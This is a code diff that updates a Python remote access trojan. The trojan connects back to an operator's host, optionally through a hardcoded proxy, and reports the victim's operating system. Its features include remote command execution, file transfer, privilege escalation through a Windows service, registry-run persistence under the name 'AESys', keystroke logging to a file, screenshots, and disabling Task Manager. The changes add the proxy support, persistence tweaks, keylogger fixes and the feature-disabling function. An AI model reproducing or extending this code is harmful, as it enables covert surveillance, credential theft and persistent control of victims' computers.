@@ -3,7 +3,7 @@
 from Crypto.Cipher import AES
 from threading import Timer
 from threading import Thread
-import subprocess, socket, base64, time, datetime, os, sys, urllib2
+import subprocess, socket, socks, base64, time, datetime, os, sys, urllib2, platform
 
 # only import img library if OS is Windows
 if os.name == 'nt':
@@ -24,7 +24,7 @@ DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"
 
 # server config
-HOST = 'Your.IP.Address.Here'
+HOST = "Your.IP.Address.Here"
 PORT = 443
 
 # session controller
@@ -58,7 +58,6 @@ def Prompt(sock, promptmsg):
 
 # upload file
 def Upload(sock, filename):
-	bgtr = True
 	# file transfer
 	try:
 		f = open(filename, 'rb')
@@ -71,10 +70,10 @@ def Upload(sock, filename):
 	except:
 		time.sleep(0.1)
 	# let server know we're done..
-	time.sleep(0.8)
+	time.sleep(10)
 	Send(sock, "")
 	time.sleep(0.8)
-	return "Finished download."
+	return "Finished download.\n"
 	
 # download file
 def Download(sock, filename):
@@ -82,11 +81,11 @@ def Download(sock, filename):
 	g = open(filename, 'wb')
 	# download file
 	fileData = Receive(sock)
-	time.sleep(0.8)
+	time.sleep(10)
 	g.write(fileData)
 	g.close()
 	# let server know we're done..
-	return "Finished upload."
+	return "Finished upload.\n"
 
 # download from url (unencrypted)
 def Downhttp(sock, url):
@@ -168,11 +167,11 @@ def Privs(sock):
 			curdir = os.path.join(sys.path[0], sys.argv[0])
 			
 			# add service
-			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
-			if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
+			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create AESys binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
+			if windowsold > 0: elvpri = Exec('sc create AESys binPath= "' + curdir + '" type= own start= auto')
 			# start service
-			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
-			if windowsold > 0: elvpri = Exec('sc start blah')
+			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start AESys')
+			if windowsold > 0: elvpri = Exec('sc start AESys')
 			# finished.
 			return "\nPrivilege escalation complete.\n"
 		
@@ -272,7 +271,7 @@ def Persist(sock, redown=None, newdir=None):
 			vbs.close()
 			
 			# add registry to startup
-			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
+			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AESys /t REG_SZ /d "' + vbsdir + '" /F')
 			persist += '\nPersistence complete.\n'
 			return persist
 			
@@ -308,7 +307,7 @@ main_thread_id = win32api.GetCurrentThreadId()
 def Keylog(k, LOG_TIME, LOG_FILENAME):
 	# only supported for Windows at the moment...
 	if os.name != 'nt': return "Not supported for this operating system.\n"
-	global LOG_TEXT, LOG_STATE, LOG_ACTIVE, main_thread_id
+	global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
 	LOG_STATE = True # begin logging!
 	main_thread_id = win32api.GetCurrentThreadId()
 	# add timestamp when it starts...
@@ -328,6 +327,8 @@ def Keylog(k, LOG_TIME, LOG_FILENAME):
 	t.start()
 	# open file to write
 	LOG_FILE = open(LOG_FILENAME, 'wb')
+	LOG_FILE.write(LOG_TEXT)
+	LOG_FILE.close()
 	hm = pyHook.HookManager()
 	hm.KeyDown = OnKeyboardEvent
 	hm.HookKeyboard()
@@ -348,12 +349,14 @@ def Keylog(k, LOG_TIME, LOG_FILENAME):
 def stopKeylog():
     win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);
 
-# this function actually records the strokes.
+# this function actually records the strokes...
 def OnKeyboardEvent(event):
 	global LOG_STATE
 	# return is it isn't logging.
 	if LOG_STATE == False: return True
-	global LOG_TEXT, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
+	global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
+	LOG_TEXT = ""
+	LOG_FILE = open(LOG_FILENAME, 'ab')
 	# check for new window activation
 	wg = win32gui
 	LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
@@ -374,10 +377,15 @@ def OnKeyboardEvent(event):
 					ss = Thread(target=takeScreenshots, args=(LOG_SCREEN[LOG_IMG],LOG_SCREENSNUM,LOG_INTERVAL))
 					ss.start()
 				LOG_IMG += 1
-			
-	if event.Ascii == 8: LOG_TEXT = LOG_TEXT[:-1]
+		LOG_FILE.write(LOG_TEXT)
+	
+	LOG_TEXT = ""	
+	if event.Ascii == 8: LOG_TEXT += "\b"
 	elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
 	else: LOG_TEXT += str(chr(event.Ascii))
+	# write to file
+	LOG_FILE.write(LOG_TEXT)
+	LOG_FILE.close()
 	
 	return True
 
@@ -393,26 +401,86 @@ def Screenshot():
 # args = number of shots, interval between shots
 def takeScreenshots(i, maxShots, intShots):
 	shot = 0
-	shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
 	while shot < maxShots:
+		shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
 		Screenshot()
 		time.sleep(intShots)
 		shot += 1
 	imgsout="Saved " + str(maxShots) + " screenshot(s) starting at: " + shottime + "\n"
 	return imgsout
 
+# this function disables certain features,
+# such as:		taskmgr
+#				persist
+#				service
+#				aeshell (everything)
+##########################################
+# REQUIRES SYSTEM PRIVS.
+def Disable(sock, feature=""):
+	# check for feature
+	if feature == "": return "You must choose a feature to disable.\n\n\tFeature:\taeshell (disables everything)\n\tFeature:\tpersist (disables persistence)\n\tFeature:\tservice (disables service)\n\tFeature:\ttaskmgr (disables taskmgr)\n"
+
+	# check for Windows
+	if os.name == 'nt':
+		# checking for access to the registry...
+		privscheck = Exec('reg query "HKU\S-1-5-19" | find "error"')
+		
+		# if user isn't system, return
+		if privscheck != '':
+			return "You must be authority\system to disable features.\n"
+		# otherwise procede
+		else:
+			disableout = "\n"
+			if feature == "taskmgr":
+				disableout += Exec('reg ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /F')
+			if feature == "persist":
+				disableout += Exec('reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AESys /F')
+			if feature == "service":
+				disableout += Exec('sc delete AESys')
+			if feature == "aeshell":
+				disableout += Exec('sc delete AESys')
+				disableout += Exec('reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AESys /F')
+				disableout += Exec('reg ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /F')
+				exedir = 'del ' + os.path.join(sys.path[0], sys.argv[0]) + ' /F'
+				disableout += Exec(exedir)
+		# finished.
+		disableout += "\n"
+		return disableout
+				
+# Proxy Settings
+#################
+shellproxy = False
+proxyaddrs = "177.36.242.57"
+proxyportn = 8080
+# user / pass
+# username = thab0ss
+# password = $#!^
+
 # main loop
 while True:
 	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((HOST, PORT))
+		if shellproxy == True:
+			s = socks.socksocket()
+			s.setproxy(socks.PROXY_TYPE_HTTP,proxyaddrs,proxyportn)
+			# if you need username and password authentication, use:
+			# s.setproxy(socks.PROXY_TYPE_HTTP, proxyaddrs, proxyportn, True, username, password)
+			s.connect((HOST, PORT))
+			shellinfo = "GET / HTTP/1.1\r\n\r\n"
+			shellinfo += "Operating System: " + str(platform.platform())
+			s.sendall(shellinfo)
+
+		else:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((HOST, PORT))
+			shellinfo = "Operating System: " + str(platform.platform())
+			s.sendall(shellinfo)
 		  
 		# create a cipher object using the random secret
 		cipher = AES.new(secret,AES.MODE_CFB)
 
 		# waiting to be activated...
 		data = Receive(s)
-	
+		
 		# activate.
 		if data == 'Activate':
 			active = True
@@ -440,20 +508,33 @@ while True:
 					stdoutput = ""
 				except:
 					stdoutput = "Error opening directory.\n"
-				
+			
+			# check for disable command
+			elif data.startswith("disable") == True:
+				# disable specified feature
+				stdoutput = Disable(s, data[8:])
 			# check for download
 			elif data.startswith("download") == True:
-				# Upload the file
-				stdoutput = Upload(s, data[9:])
+				try:
+					# Upload the file
+					stdoutput = Upload(s, data[9:])
+				except:
+					stdoutput = "Error transferring file, please try again.\n"
 			
 			elif data.startswith("downhttp") == True:
-				# Download from url
-				stdoutput = Downhttp(s, data[9:])
+				try:
+					# Download from url
+					stdoutput = Downhttp(s, data[9:])
+				except:
+					stdoutput = "Error downloading from url, please try again.\n"
 
 			# check for upload
 			elif data.startswith("upload") == True:
-				# Download the file
-				stdoutput = Download(s, data[7:])
+				try:
+					# Download the file
+					stdoutput = Download(s, data[7:])
+				except:
+					stdoutput = "Error transferring file, please try again.\n"
 				
 			elif data.startswith("privs") == True:
 				# Attempt to elevate privs
@@ -466,21 +547,25 @@ while True:
 				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
 			
 			elif data.startswith("keylog") == True:
-				# Keylogging
-				LOG_THREAD = "keylog"
+				# if already logging, let the server know
+				if LOG_STATE == True:
+					stdoutput = "Keylogger is already writing to " + LOG_FILENAME + "\n"
+				# otherwise, begin logging! :]
+				else:
+					# Keylogging
+					LOG_THREAD = "keylog"
+					LOG_FILENAME = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
+					if len(data.split(' ')) == 1:
+						LOG_TIME = 420000
+					if len(data.split(' ')) == 2: 
+						LOG_TIME = float(data.split(' ')[1])
+					elif len(data.split(' ')) == 3: 
+						LOG_TIME = float(data.split(' ')[1])
+						LOG_FILENAME = str(data.split(' ')[2])
 				
-				if len(data.split(' ')) == 1:
-					LOG_FILENAME = str('keylog.txt')
-					LOG_TIME = 20
-				if len(data.split(' ')) == 2: 
-					LOG_TIME = float(data.split(' ')[1])
-				elif len(data.split(' ')) == 3: 
-					LOG_TIME = float(data.split(' ')[1])
-					LOG_FILENAME = str(data.split(' ')[2])
-				
-				kk = Thread(target=Keylog, args=(LOG_THREAD,LOG_TIME,LOG_FILENAME))
-				kk.start()
-				stdoutput = "Logging keystrokes to " + LOG_FILENAME + " for " + str(LOG_TIME) + "\n"#Keylog(LOG_THREAD, LOG_TIME, LOG_FILENAME)
+					kk = Thread(target=Keylog, args=(LOG_THREAD,LOG_TIME,LOG_FILENAME))
+					kk.start()
+					stdoutput = "Logging keystrokes to " + LOG_FILENAME + " for " + str(LOG_TIME) + "\n"#Keylog(LOG_THREAD, LOG_TIME, LOG_FILENAME)
 			
 			# take one screenshot
 			elif data.startswith("screenshot") == True:
@@ -502,7 +587,7 @@ while True:
 				stdoutput = Exec(data)
 
 			# send data
-			stdoutput = stdoutput+"\n"+os.getcwd()+">"
+			stdoutput = "\n"+stdoutput+"\n"+os.getcwd()+">"
 			Send(s, stdoutput)
 			
 		# loop ends here
@@ -512,6 +597,6 @@ while True:
 		time.sleep(3)
 	except socket.error:
 		s.close()
-		time.sleep(10)
+		time.sleep(30)
 		continue
 	      
